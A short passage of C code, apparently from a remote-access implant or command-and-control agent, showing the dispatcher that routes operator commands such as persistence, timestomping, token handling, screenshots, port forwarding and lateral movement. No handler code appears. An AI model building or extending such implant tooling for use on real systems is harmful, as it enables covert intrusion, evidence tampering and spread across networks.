    if (strcmp(cmd->type, "stomp")          == 0) return CmdStomp(cmd);
    if (strcmp(cmd->type, "ul")             == 0) return CmdUpload(cmd);
    if (strcmp(cmd->type, "dl")             == 0) return CmdDownload(cmd);
    if (strcmp(cmd->type, "persist")        == 0) return CmdPersist(cmd);
    if (strcmp(cmd->type, "remove_persist") == 0) return CmdRemovePersist(cmd);
    if (strcmp(cmd->type, "token")          == 0) return CmdToken(cmd);
    if (strcmp(cmd->type, "timestomp")      == 0) return CmdTimestomp(cmd);
    if (strcmp(cmd->type, "screenshot")     == 0) return CmdScreenshot(cmd);
    if (strcmp(cmd->type, "portfwd_open")   == 0) return CmdPortFwdOpen(cmd);
    if (strcmp(cmd->type, "portfwd_send")   == 0) return CmdPortFwdSend(cmd);
    if (strcmp(cmd->type, "portfwd_close")  == 0) return CmdPortFwdClose(cmd);
    if (strcmp(cmd->type, "lateral")        == 0) return CmdLateral(cmd);

    char msg[64];
    xsnprintf(msg, sizeof(msg), "unknown command: %s", cmd->type);
    return ErrorResult(cmd, msg);
}
